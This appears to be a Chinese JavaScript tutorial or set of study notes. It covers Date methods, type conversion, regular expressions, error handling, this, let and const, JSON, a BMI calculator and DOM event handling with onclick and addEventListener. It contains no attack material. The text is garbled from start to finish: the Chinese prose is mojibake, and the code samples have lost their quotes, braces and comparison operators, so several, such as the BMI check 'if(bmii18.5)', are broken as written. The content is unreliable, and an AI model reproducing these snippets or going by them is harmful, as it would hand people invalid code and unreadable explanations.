å¯¹è±¡è¿”å›ä¸€ä¸ªæœˆä¸­çš„æŸä¸€å¤© (1 ~ 31)ã€‚ getDay() ä» Date å¯¹è±¡è¿”å›ä¸€å‘¨ä¸­çš„æŸä¸€å¤© (0 ~ 6)ã€‚ getFullYear() ä» Date å¯¹è±¡ä»¥å››ä½æ•°å­—è¿”å›å¹´ä»½ã€‚ getHours() è¿”å› Date å¯¹è±¡çš„å°æ—¶ (0 ~ 23)ã€‚ getMilliseconds() è¿”å› Date å¯¹è±¡çš„æ¯«ç§’(0 ~ 999)ã€‚ getMinutes() è¿”å› Date å¯¹è±¡çš„åˆ†é’Ÿ (0 ~ 59)ã€‚ getMonth() ä» Date å¯¹è±¡è¿”å›æœˆä»½ (0 ~ 11)ã€‚ getSeconds() è¿”å› Date å¯¹è±¡çš„ç§’æ•° (0 ~ 59)ã€‚ getTime() è¿”å› 1970 å¹´ 1 æœˆ 1 æ—¥è‡³ä»Šçš„æ¯«ç§’æ•°ã€‚ å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­— å…¨å±€æ–¹æ³• Number() Number(3.14) // è¿”å› 3.14Number( ) // è¿”å› 0Number() // è¿”å› 0Number(99 88) // è¿”å› NaN æ–¹æ³• æè¿° parseFloat() è§£æä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ parseInt() è§£æä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚ å°†å¸ƒå°”å€¼è½¬æ¢ä¸ºæ•°å­— å…¨å±€æ–¹æ³• Number() å°†æ—¥æœŸè½¬æ¢ä¸ºæ•°å­— å…¨å±€æ–¹æ³• Number() d = new Date();Number(d) æ—¥æœŸæ–¹æ³• getTime() d = new Date();d.getTime() è‡ªåŠ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸² å½“ä½ å°è¯•è¾“å‡ºä¸€ä¸ªå¯¹è±¡æˆ–ä¸€ä¸ªå˜é‡æ—¶ JavaScript ä¼šè‡ªåŠ¨è°ƒç”¨å˜é‡çš„ toString() æ–¹æ³•ï¼š document.getElementById(demo).innerHTML = myVar;myVar = name:Fjohn // toString è½¬æ¢ä¸º [object Object]myVar = [1,2,3,4] // toString è½¬æ¢ä¸º 1,2,3,4myVar = new Date() // toString è½¬æ¢ä¸º Fri Jul 18 2014 09:08:55 GMT+0200 æ•°å­—å’Œå¸ƒå°”å€¼ä¹Ÿç»å¸¸ç›¸äº’è½¬æ¢ï¼š myVar = 123 // toString è½¬æ¢ä¸º 123myVar = true // toString è½¬æ¢ä¸º truemyVar = false // toString è½¬æ¢ä¸º false JavaScript æ­£åˆ™è¡¨è¾¾å¼ ä½¿ç”¨å•ä¸ªå­—ç¬¦ä¸²æ¥æè¿°ã€åŒ¹é…ä¸€ç³»åˆ—ç¬¦åˆæŸä¸ªå¥æ³•è§„åˆ™çš„å­—ç¬¦ä¸²æœç´¢æ¨¡å¼ æ­£åˆ™è¡¨è¾¾å¼å¯ç”¨äºæ‰€æœ‰æ–‡æœ¬æœç´¢å’Œæ–‡æœ¬æ›¿æ¢çš„æ“ä½œ /æ­£åˆ™è¡¨è¾¾å¼ä¸»ä½“/ä¿®é¥°ç¬¦(å¯é€‰) var patt = /runoob/i /runoob/i æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚runoob æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸»ä½“ (ç”¨äºæ£€ç´¢)ã€‚i æ˜¯ä¸€ä¸ªä¿®é¥°ç¬¦ (æœç´¢ä¸åŒºåˆ†å¤§å°å†™) å­—ç¬¦ä¸²çš„ä½¿ç”¨ search() æ–¹æ³•ç”¨äºæ£€ç´¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­å­—ç¬¦ä¸²ï¼Œæˆ–æ£€ç´¢ä¸æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›å­ä¸²çš„èµ·å§‹ä½ç½®ã€‚ replace() æ–¹æ³•ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­ç”¨ä¸€äº›å­—ç¬¦ä¸²æ›¿æ¢å¦ä¸€äº›å­—ç¬¦ä¸²ï¼Œæˆ–æ›¿æ¢ä¸€ä¸ªä¸æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å­ä¸²ã€‚ RegExp å¯¹è±¡ test()ä½¿ç”¨ test() æ–¹æ³•ç”¨äºæ£€æµ‹ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…æŸä¸ªæ¨¡å¼ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­å«æœ‰åŒ¹é…çš„æ–‡æœ¬ï¼Œåˆ™è¿”å› true æœç´¢å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ â€œeâ€ï¼š var patt = /e/;patt.test(The best things in life are free!); æˆ–ï¼š /e/.test(The best things in life are free!) exec()ä½¿ç”¨ exec() æ–¹æ³•ç”¨äºæ£€ç´¢å­—ç¬¦ä¸²ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­å­˜æ”¾åŒ¹é…çš„ç»“æœã€‚å¦‚æœæœªæ‰¾åˆ°åŒ¹é…ï¼Œåˆ™è¿”å›å€¼ä¸º null var patt1=new RegExp(e);document.write(patt1.exec(The best things in life are free)); è¾“å‡ºä¸ºe JavaScript é”™è¯¯ throwè¯­å¥åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯ try è¯­å¥æµ‹è¯•ä»£ç å—çš„é”™è¯¯ catch è¯­å¥å¤„ç†é”™è¯¯ finally è¯­å¥ finally è¯­å¥ä¸è®ºä¹‹å‰çš„ try å’Œ catch ä¸­æ˜¯å¦äº§ç”Ÿå¼‚å¸¸éƒ½ä¼šæ‰§è¡Œè¯¥ä»£ç å— JavaScript è¡¨å• JavaScript è¡¨å•éªŒè¯ JavaScript éªŒè¯è¾“å…¥çš„æ•°å­— JavaScriptå…³é”®å­— this æ–¹æ³•ä¸­çš„ this this æŒ‡å‘è°ƒç”¨å®ƒæ‰€åœ¨æ–¹æ³•çš„å¯¹è±¡ å•ç‹¬ä½¿ç”¨ this å•ç‹¬ä½¿ç”¨ thisï¼Œåˆ™å®ƒæŒ‡å‘å…¨å±€(Global)å¯¹è±¡ å‡½æ•°ä¸­ä½¿ç”¨ this åœ¨å‡½æ•°ä¸­ï¼Œå‡½æ•°çš„æ‰€å±è€…é»˜è®¤ç»‘å®šåˆ° this ä¸Š ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œthis ä¸º undefinedï¼Œå› ä¸ºä¸¥æ ¼æ¨¡å¼ä¸‹ä¸å…è®¸é»˜è®¤ç»‘å®š äº‹ä»¶ä¸­çš„ this this æŒ‡å‘äº†æ¥æ”¶äº‹ä»¶çš„ HTML å…ƒç´  å¯¹è±¡æ–¹æ³•ä¸­ç»‘å®š this æ˜¯ person å¯¹è±¡ï¼Œperson å¯¹è±¡æ˜¯å‡½æ•°çš„æ‰€æœ‰è€… this.firstName è¡¨ç¤º this (person) å¯¹è±¡çš„ firstName å±æ€§ æ˜¾å¼å‡½æ•°ç»‘å®š å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå¯¹è±¡åˆ™æœ‰æ–¹æ³•ï¼Œapply å’Œ call å°±æ˜¯å‡½æ•°å¯¹è±¡çš„æ–¹æ³•ï¼Œä»–ä»¬å…è®¸åˆ‡æ¢å‡½æ•°æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆcontextï¼‰ï¼Œå³ this ç»‘å®šçš„å¯¹è±¡ let let å£°æ˜çš„å˜é‡åªåœ¨ let å‘½ä»¤æ‰€åœ¨çš„ä»£ç å— {} å†…æœ‰æ•ˆï¼Œåœ¨ {} ä¹‹å¤–ä¸èƒ½è®¿é—® åœ¨ç›¸åŒçš„ä½œç”¨åŸŸæˆ–å—çº§ä½œç”¨åŸŸä¸­ï¼Œä¸èƒ½ä½¿ç”¨ let å…³é”®å­—æ¥é‡ç½® let å…³é”®å­—å£°æ˜çš„å˜é‡ const const ç”¨äºå£°æ˜ä¸€ä¸ªæˆ–å¤šä¸ªå¸¸é‡ï¼Œå£°æ˜æ—¶å¿…é¡»è¿›è¡Œåˆå§‹åŒ–ï¼Œå®šä¹‰å¸¸é‡çš„å€¼ä¸èƒ½é€šè¿‡å†èµ‹å€¼ä¿®æ”¹ï¼Œä¹Ÿä¸èƒ½å†æ¬¡å£°æ˜ const å®šä¹‰çš„å˜é‡å¹¶éå¸¸é‡ï¼Œå¹¶éä¸å¯å˜ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªå¸¸é‡å¼•ç”¨ä¸€ä¸ªå€¼ã€‚ä½¿ç”¨ const å®šä¹‰çš„å¯¹è±¡æˆ–è€…æ•°ç»„ï¼Œå…¶å®æ˜¯å¯å˜çš„ // åˆ›å»ºå¸¸é‡å¯¹è±¡const car = type:Fiat, model:500, color:white;// ä¿®æ”¹å±æ€§:car.color = red;// æ·»åŠ å±æ€§car.owner = Johnson; // åˆ›å»ºå¸¸é‡æ•°ç»„const cars = [Saab, Volvo, BMW];// ä¿®æ”¹å…ƒç´ cars[0] = Toyota;// æ·»åŠ å…ƒç´ cars.push(Audi); void æŒ‡å®šè¦è®¡ç®—ä¸€ä¸ªè¡¨è¾¾å¼ä½†æ˜¯ä¸è¿”å›å€¼ href=#ä¸href=javascript:void(0)çš„åŒºåˆ« # åŒ…å«äº†ä¸€ä¸ªä½ç½®ä¿¡æ¯ï¼Œé»˜è®¤çš„é”šæ˜¯**#top** ä¹Ÿå°±æ˜¯ç½‘é¡µçš„ä¸Šç«¯ã€‚è€Œjavascript:void(0), ä»…ä»…è¡¨ç¤ºä¸€ä¸ªæ­»é“¾æ¥ã€‚åœ¨é¡µé¢å¾ˆé•¿çš„æ—¶å€™ä¼šä½¿ç”¨ # æ¥å®šä½é¡µé¢çš„å…·ä½“ä½ç½®ï¼Œæ ¼å¼ä¸ºï¼š# + id JavaScript JSON JSON æ˜¯ç”¨äºå­˜å‚¨å’Œä¼ è¾“æ•°æ®çš„æ ¼å¼ï¼Œ é€šå¸¸ç”¨äºæœåŠ¡ç«¯å‘ç½‘é¡µä¼ é€’æ•°æ® JSON æ•°ç»„ sites:[ name:Runoob, url:www.runoob.com, name:Google, url:www.google.com, name:Taobao, url:www.taobao.com] JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º JavaScript å¯¹è±¡ var text = sites : [ + name:Runoob , url:www.runoob.com , + name:Google , url:www.google.com , + name:Taobao , url:www.taobao.com ]; obj = JSON.parse(text);document.getElementById(demo).innerHTML = obj.sites[1].name + + obj.sites[1].url; å‡½æ•° æè¿° JSON.parse() ç”¨äºå°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º JavaScript å¯¹è±¡ã€‚ JSON.stringify() ç”¨äºå°† JavaScript å€¼è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²ã€‚ !DOCTYPE htmlhtmlbodyfieldset legendBMIè®¡ç®—å™¨/legend label for=meter èº«é«˜(m)/label input id=meter required br label for=weight ä½“é‡(kg)/label input id=weight required button onclick=myFunction()è·å–BMI/button p id=bmi/p script function myFunction() var meter,weight,bmii,a; meter=document.getElementById(meter).value; weight=document.getElementById(weight).value; bmii=(weight/(meter*meter)).toFixed(2); if (isNaN(meter)||isNaN(weight)||meter = 0||weight = 0) document.getElementById(bmi).innerHTML = è¯·æ­£ç¡®å¡«å†™èº«é«˜å’Œä½“é‡ï¼; return; if(bmii18.5)a=ä½“é‡è¿‡ä½; else if(bmii=24)a=ä½“é‡è¿‡é«˜; else a=æ­£å¸¸; document.getElementById(bmi).innerHTML=bmii+a; /script/fieldset/body/html buttonå…ƒç´  å¸¸ç”¨äºè§¦å‘æŸäº›æ“ä½œæˆ–äº‹ä»¶ï¼Œå¦‚æäº¤è¡¨å•ã€æ‰§è¡Œ JavaScript å‡½æ•°ç­‰ã€‚ä½ å¯ä»¥é€šè¿‡ button å…ƒç´ æ¥åˆ›å»ºå„ç§ç±»å‹çš„æŒ‰é’®ï¼Œå¹¶ä¸”å¯ä»¥ä¸ºå®ƒä»¬æ·»åŠ ä¸åŒçš„å±æ€§å’Œäº‹ä»¶ç›‘å¬å™¨ å¸¸ç”¨å±æ€§ type å±æ€§ button type=buttonæ™®é€šæŒ‰é’®/button button type=submitæäº¤æŒ‰é’®/button button type=reseté‡ç½®æŒ‰é’®/button disabled å±æ€§ ç¦ç”¨æŒ‰é’®ï¼Œç”¨æˆ·æ— æ³•ç‚¹å‡» button disabledç¦ç”¨æŒ‰é’®/button autofocus å±æ€§ é¡µé¢åŠ è½½æ—¶ï¼Œè‡ªåŠ¨èšç„¦åˆ°æŒ‰é’® button autofocusè‡ªåŠ¨èšç„¦æŒ‰é’®/button name å±æ€§ ä¸ºæŒ‰é’®æŒ‡å®šåç§°ï¼Œé€šå¸¸åœ¨è¡¨å•æäº¤æ—¶ä½¿ç”¨ button name=submitBtn type=submitæäº¤/button value å±æ€§ ä¸ºæŒ‰é’®æŒ‡å®šä¸€ä¸ªå€¼ï¼Œé€šå¸¸é…åˆ type=submit ä½¿ç”¨ï¼Œè¡¨ç¤ºæäº¤æ—¶ä¼ é€’çš„å‚æ•°å€¼ button type=submit value=submitFormæäº¤è¡¨å•/button ä½¿ç”¨ JavaScript ä¸æŒ‰é’®äº¤äº’ å¯ä»¥ä½¿ç”¨ JavaScript ä¸ºæŒ‰é’®æ·»åŠ ç‚¹å‡»äº‹ä»¶ï¼Œæ‰§è¡Œç‰¹å®šçš„æ“ä½œ å¯ä»¥é€šè¿‡ addEventListener() æ–¹æ³•ç»‘å®šå¤šä¸ªäº‹ä»¶ï¼Œæ”¯æŒå¤æ‚çš„äº‹ä»¶å¤„ç†å’Œç›‘å¬ button onclick=alert(æŒ‰é’®è¢«ç‚¹å‡»ï¼)ç‚¹å‡»æˆ‘/buttonscript // ä¹Ÿå¯ä»¥é€šè¿‡ JavaScript æ¥ç»‘å®šäº‹ä»¶ const button = document.querySelector(button); button.addEventListener(click, function() alert(æŒ‰é’®è¢«ç‚¹å‡»ï¼); );/script åŠ¨æ€æŒ‰é’® æŒ‰é’®å¯ä»¥é€šè¿‡ JavaScript æ¥åŠ¨æ€æ”¹å˜æ–‡æœ¬ã€é¢œè‰²æˆ–çŠ¶æ€ button id=myButton onclick=changeText()ç‚¹å‡»æˆ‘/buttonscript function changeText() const button = document.getElementById(myButton); button.innerHTML = æŒ‰é’®å·²è¢«ç‚¹å‡»; button.style.backgroundColor = red; button.disabled = true; // ç¦ç”¨æŒ‰é’® /script onclickä¸addEventListener() oncllick ä¸€ä¸ª HTML äº‹ä»¶å±æ€§ï¼Œç”¨äºåœ¨ç”¨æˆ·ç‚¹å‡»æŸä¸ªå…ƒç´ æ—¶è§¦å‘æŒ‡å®šçš„ JavaScript å‡½æ•°æˆ–ä»£ç ã€‚è¿™ä¸ªäº‹ä»¶æœ€å¸¸è§çš„ç”¨æ³•æ˜¯åœ¨æŒ‰é’®ã€é“¾æ¥æˆ–ä»»ä½•å¯ç‚¹å‡»çš„å…ƒç´ ä¸Šç»‘å®šç‚¹å‡»äº‹ä»¶ åŸºæœ¬ç”¨æ³• åœ¨ HTML ä¸­ä½¿ç”¨ onclick button onclick=alert(æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼)ç‚¹å‡»æˆ‘/button è°ƒç”¨ JavaScript å‡½æ•° button onclick=myFunction()ç‚¹å‡»æˆ‘/buttonscript function myFunction() alert(æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼); /script é€šè¿‡ JavaScript åŠ¨æ€ç»‘å®š onclick äº‹ä»¶ button id=myButtonç‚¹å‡»æˆ‘/buttonscript document.getElementById(myButton).onclick = function() alert(æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼); ;/script ä½¿ç”¨ JavaScript é€‰æ‹©äº† ID ä¸º myButton çš„æŒ‰é’®ï¼Œå¹¶ä¸ºå…¶æ·»åŠ äº†ä¸€ä¸ª onclick äº‹ä»¶ç›‘å¬å™¨ é€šè¿‡ onclick ä¼ é€’äº‹ä»¶å¯¹è±¡ï¼ˆeventï¼‰ è·å–æœ‰å…³äº‹ä»¶çš„æ›´å¤šä¿¡æ¯ï¼ˆå¦‚ç‚¹å‡»ä½ç½®ã€ç›®æ ‡å…ƒç´ ç­‰ï¼‰ button onclick=myFunction(event)ç‚¹å‡»æˆ‘/buttonscript function myFunction(event) alert(ç‚¹å‡»ä½ç½®ï¼šX = + event.clientX + , Y = + event.clientY); /script æ­¤ä¾‹ä¸­ï¼Œevent å¯¹è±¡åŒ…å«äº†æœ‰å…³ç‚¹å‡»äº‹ä»¶çš„ä¿¡æ¯ï¼Œå¦‚é¼ æ ‡çš„ clientX å’Œ clientY åæ ‡ ä½¿ç”¨ event.preventDefault()é˜»æ­¢é»˜è®¤è¡Œä¸º é˜»æ­¢ç‚¹å‡»äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºï¼ˆå¦‚ç‚¹å‡»é“¾æ¥æ—¶è·³è½¬ã€æäº¤è¡¨å•ç­‰ï¼‰ a href=https://www.example.com onclick=preventDefaultAction(event)ç‚¹å‡»æˆ‘/ascript function preventDefaultAction(event) event.preventDefault(); alert(é»˜è®¤è¡Œä¸ºå·²è¢«é˜»æ­¢); /script ä½¿ç”¨ this å¼•ç”¨å½“å‰å…ƒç´  button onclick=showMessage(this)ç‚¹å‡»æˆ‘/buttonscript function showMessage(button) alert(æŒ‰é’®çš„æ–‡æœ¬æ˜¯ï¼š + button.innerText); /script ä¾‹å­ä¸­ï¼Œthis ä»£è¡¨æŒ‰é’®æœ¬èº«ï¼Œbutton.innerText è·å–æŒ‰é’®çš„æ–‡æœ¬å†…å®¹ addEventListener() æ˜¯ JavaScript ä¸­ç”¨äºå‘å…ƒç´ æ·»åŠ äº‹ä»¶ç›‘å¬å™¨çš„æ–¹æ³•ã€‚ä¸ onclick å±æ€§ç›¸æ¯”ï¼ŒaddEventListener() æ›´åŠ çµæ´»å’Œå¼ºå¤§ï¼Œå®ƒå…è®¸ç»‘å®šå¤šä¸ªäº‹ä»¶ç›‘å¬å™¨ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ›´å¥½åœ°æ§åˆ¶äº‹ä»¶ä¼ æ’­ã€æ•è·ä¸å†’æ³¡æœºåˆ¶ åŸºæœ¬è¯­æ³• element.addEventListener(event, function, useCapture); eventï¼šäº‹ä»¶ç±»å‹ï¼ˆå¦‚ clickã€mouseoverã€keydown ç­‰ï¼‰ã€‚ functionï¼šäº‹ä»¶è§¦å‘æ—¶æ‰§è¡Œçš„å›è°ƒå‡½æ•°ã€‚ useCaptureï¼ˆå¯é€‰ï¼‰ï¼šä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæŒ‡å®šäº‹ä»¶æ˜¯åº”è¯¥åœ¨æ•è·é˜¶æ®µè§¦å‘ï¼ˆtrueäº‹ä»¶ä»æ–‡æ¡£çš„æ ¹èŠ‚ç‚¹åˆ°è¾¾ç›®æ ‡å…ƒç´ ï¼‰ï¼Œè¿˜æ˜¯åœ¨å†’æ³¡é˜¶æ®µè§¦å‘ï¼ˆfalseäº‹ä»¶ä»ç›®æ ‡å…ƒç´ è¿”å›åˆ°æ–‡æ¡£çš„æ ¹èŠ‚ç‚¹ï¼‰ã€‚é»˜è®¤å€¼ä¸º falseã€‚ åŸºæœ¬ç”¨æ³• æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬å™¨ button id=myButtonç‚¹å‡»æˆ‘/buttonscript const button = document.getElementById(myButton); // æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬å™¨ button.addEventListener(click, function() alert(æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼); );/script ä¼ é€’äº‹ä»¶å¯¹è±¡ addEventListener() æ–¹æ³•ä¼šè‡ªåŠ¨ä¼ é€’ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ç»™å›è°ƒå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¯¥å¯¹è±¡è·å–æ›´å¤šå…³äºäº‹ä»¶çš„ä¿¡æ¯ button id=myButtonç‚¹å‡»æˆ‘/buttonscript const button = document.getElementById(myButton); button.addEventListener(click, function(event) alert(ç‚¹å‡»ä½ç½®ï¼šX = + event.clientX + , Y = + event.clientY); );/script ä½¿ç”¨ this è®¿é—®è§¦å‘äº‹ä»¶çš„å…ƒç´  åœ¨ addEventListener() ä¸­ï¼Œthis é€šå¸¸æŒ‡å‘è§¦å‘äº‹ä»¶çš„å…ƒç´ ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ this æ¥è®¿é—®è¯¥å…ƒç´ çš„å±æ€§ button id=myButtonç‚¹å‡»æˆ‘/buttonscript const button = document.getElementById(myButton); button.addEventListener(click, function() alert(æŒ‰é’®çš„æ–‡æœ¬æ˜¯ï¼š + this.innerText); );/script æ·»åŠ å¤šä¸ªäº‹ä»¶ç›‘å¬å™¨ addEventListener() å…è®¸ä½ ä¸ºåŒä¸€ä¸ªå…ƒç´ æ·»åŠ å¤šä¸ªäº‹ä»¶ç›‘å¬å™¨ button id=myButtonç‚¹å‡»æˆ‘/buttonscript const button = document.getElementById(myButton); button.addEventListener(click, function() alert(ç¬¬ä¸€ä¸ªäº‹ä»¶); ); button.addEventListener(click, function() alert(ç¬¬äºŒä¸ªäº‹ä»¶); );/script ä¾‹å­ä¸­ï¼Œå½“æŒ‰é’®è¢«ç‚¹å‡»æ—¶ï¼Œä¸¤ä¸ªè­¦å‘Šæ¡†ä¼šä¾æ¬¡å¼¹å‡º ç§»é™¤äº‹ä»¶ç›‘å¬å™¨ ç”¨ removeEventListener() æ–¹æ³•æ¥ç§»é™¤å·²ç»æ·»åŠ çš„äº‹ä»¶ç›‘å¬å™¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒremoveEventListener() åªèƒ½ç§»é™¤é€šè¿‡ addEventListener() æ·»åŠ çš„äº‹ä»¶ç›‘å¬å™¨ï¼Œå¹¶ä¸”éœ€è¦ä¼ é€’ç›¸åŒçš„äº‹ä»¶ç±»å‹å’Œå›è°ƒå‡½æ•° button id=myButtonç‚¹å‡»æˆ‘/buttonscript const button = document.getElementById(myButton); function handleClick() alert(æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼); button.addEventListener(click, handleClick); // ç§»é™¤äº‹ä»¶ç›‘å¬å™¨ button.removeEventListener(click, handleClick);/script JavaScript HTML DOM DOM HTML æŸ¥æ‰¾ HTML å…ƒç´  é€šè¿‡ id æ‰¾åˆ° HTML å…ƒç´  p id=introä½ å¥½ä¸–ç•Œ!/ppè¯¥å®ä¾‹å±•ç¤ºäº† bgetElementById/b æ–¹æ³•!/pscriptx=document.getElementById(intro);document.write(pæ–‡æœ¬æ¥è‡ª id ä¸º intro æ®µè½: + x.innerHTML + /p);/script é€šè¿‡æ ‡ç­¾åæ‰¾åˆ° HTML å…ƒç´  æŸ¥æ‰¾ id=â€œmainâ€ çš„å…ƒç´ ï¼Œç„¶åæŸ¥æ‰¾ id=â€œmainâ€ å…ƒç´ ä¸­çš„æ‰€æœ‰ p å…ƒç´  pä½ å¥½ä¸–ç•Œ!/pdiv id=mainp DOM æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚/ppè¯¥å®ä¾‹å±•ç¤ºäº† bgetElementsByTagName/b æ–¹æ³•/p/divscriptvar x=document.getElementById(main);var y=x.getElementsByTagName(p);document.write(id=mainå…ƒç´ ä¸­çš„ç¬¬ä¸€ä¸ªæ®µè½ä¸ºï¼š + y[0].innerHTML);/script é€šè¿‡ç±»åæ‰¾åˆ° HTML å…ƒç´  p class=introä½ å¥½ä¸–ç•Œ!/ppè¯¥å®ä¾‹å±•ç¤ºäº† bgetElementsByClassName/b æ–¹æ³•!/pscriptx=document.getElementsByClassName(intro);document.write(pæ–‡æœ¬æ¥è‡ª class ä¸º intro æ®µè½: + x[0].innerHTML + /p);/script æ”¹å˜HTML æ”¹å˜ HTML è¾“å‡ºæµ åœ¨ JavaScript ä¸­ï¼Œdocument.write() å¯ç”¨äºç›´æ¥å‘ HTML è¾“å‡ºæµå†™å†…å®¹ [!CAUTION] ç»å¯¹ä¸è¦åœ¨æ–‡æ¡£(DOM)åŠ è½½å®Œæˆä¹‹åä½¿ç”¨ document.write()ã€‚è¿™ä¼šè¦†ç›–è¯¥æ–‡æ¡£ æ”¹å˜ HTML å†…å®¹ ä¿®æ”¹ HTML å†…å®¹çš„æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ innerHTML å±æ€§ document.getElementById(id).innerHTML=æ–°çš„ HTML æ”¹å˜ HTML å±æ€§ document.getElementById(id).attribute=æ–°å±æ€§å€¼ DOM CSS æ”¹å˜ HTML æ ·å¼ document.getElementById(id).style.property=æ–°æ ·å¼ ä½¿ç”¨äº‹ä»¶ HTML DOM å…è®¸æˆ‘ä»¬é€šè¿‡è§¦å‘äº‹ä»¶æ¥æ‰§è¡Œä»£ç  æ¯”å¦‚äº‹ä»¶ï¼šå…ƒç´ è¢«ç‚¹å‡»ã€‚é¡µé¢åŠ è½½å®Œæˆã€‚è¾“å…¥æ¡†è¢«ä¿®æ”¹ã€‚ ä¸‹ä¾‹æ”¹å˜å­—ä½“é¢œè‰² h1 id=id1æˆ‘çš„æ ‡é¢˜ 1/h1button type=button onclick=document.getElementById(id1).style.color=redç‚¹æˆ‘!/button ä¸‹ä¾‹ä½¿å…ƒç´ æ˜¾ç¤ºæˆ–æ¶ˆå¤± p id=p1è¿™æ˜¯ä¸€ä¸ªæ–‡æœ¬ã€‚/pinput type=button value=éšè—æ–‡æœ¬ onclick=document.getElementById(p1).style.visibility=hidden /input type=button value=æ˜¾ç¤ºæ–‡æœ¬ onclick=document.getElementById(p1).style.visibility=visible / DOM äº‹ä»¶ å¯¹äº‹ä»¶åšå‡ºååº” ç”¨æˆ·ç‚¹å‡»æŸä¸ªå…ƒç´ æ—¶æ‰§è¡Œä»£ç  h1 onclick=this.innerHTML=Ooops!ç‚¹å‡»æ–‡æœ¬!/h1 h1 onclick=changetext(this)ç‚¹å‡»æ–‡æœ¬!/h1scriptfunction changetext(id) id.innerHTML=Ooops!;/script HTMLäº‹ä»¶å±æ€§ å¦‚éœ€å‘ HTML å…ƒç´ åˆ†é… äº‹ä»¶ï¼Œå¯ä»¥ä½¿ç”¨äº‹ä»¶å±æ€§ å¦‚å‘ button å…ƒç´ åˆ†é… onclick äº‹ä»¶ï¼š pç‚¹å‡»æŒ‰é’®æ‰§è¡Œ emdisplayDate()/em å‡½æ•°./pbutton onclick=displayDate()ç‚¹è¿™é‡Œ/buttonscriptfunction displayDate() document.getElementById(demo).innerHTML=Date();/scriptp id=demo/p ä½¿ç”¨HTML DOM æ¥åˆ†é…äº‹ä»¶ å¦‚å‘ button å…ƒç´ åˆ†é… onclick äº‹ä»¶ï¼š pç‚¹å‡»æŒ‰é’®æ‰§è¡Œ emdisplayDate()/em å‡½æ•°./pbutton id=myBtnç‚¹è¿™é‡Œ/buttonscriptdocument.getElementById(myBtn).onclick=function()displayDate();function displayDate() document.getElementById(demo).innerHTML=Date();/scriptp id=demo/p ä¸Šä¾‹ä¸­ï¼Œåä¸º displayDate çš„å‡½æ•°è¢«åˆ†é…ç»™ id=â€œmyBtnâ€ çš„ HTML å…ƒç´ ã€‚ æŒ‰é’®ç‚¹å‡»æ—¶Javascriptå‡½æ•°å°†ä¼šè¢«æ‰§è¡Œ onloadå’Œonunloadäº‹ä»¶ onload å’Œ onunload äº‹ä»¶ä¼šåœ¨ç”¨æˆ·è¿›å…¥æˆ–ç¦»å¼€é¡µé¢æ—¶è¢«è§¦å‘ [!NOTE] onload äº‹ä»¶å¯ç”¨äºæ£€æµ‹è®¿é—®è€…çš„æµè§ˆå™¨ç±»å‹å’Œæµè§ˆå™¨ç‰ˆæœ¬ï¼Œå¹¶åŸºäºè¿™äº›ä¿¡æ¯æ¥åŠ è½½ç½‘é¡µçš„æ­£ç¡®ç‰ˆæœ¬ã€‚ onload å’Œ onunload äº‹ä»¶å¯ç”¨äºå¤„ç† cookie body onload=checkCookies()scriptfunction checkCookies() if (navigator.cookieEnabled==true) alert(Cookies å¯ç”¨) else alert(Cookies ä¸å¯ç”¨) /scriptpå¼¹çª—-æç¤ºæµè§ˆå™¨ cookie æ˜¯å¦å¯ç”¨ã€‚/p /body onchangeäº‹ä»¶ onchange äº‹ä»¶å¸¸ç»“åˆå¯¹è¾“å…¥å­—æ®µçš„éªŒè¯æ¥ä½¿ç”¨ scriptfunction myFunction() var x=document.getElementById(fname); x.value=x.value.toUpperCase();/scriptè¾“å…¥ä½ çš„åå­—: input type=text id=fname onchange=myFunction()på½“ä½ ç¦»å¼€è¾“å…¥æ¡†åï¼Œå‡½æ•°å°†è¢«è§¦å‘ï¼Œå°†å°å†™å­—æ¯è½¬ä¸ºå¤§å†™å­—æ¯ã€‚/p onmouseover å’Œ onmouseout äº‹ä»¶ onmouseover å’Œ onmouseout äº‹ä»¶å¯ç”¨äºåœ¨ç”¨æˆ·çš„é¼ æ ‡ç§»è‡³ HTML å…ƒç´ ä¸Šæ–¹æˆ–ç§»å‡ºå…ƒç´ æ—¶è§¦å‘å‡½æ•° div onmouseover=mOver(this) 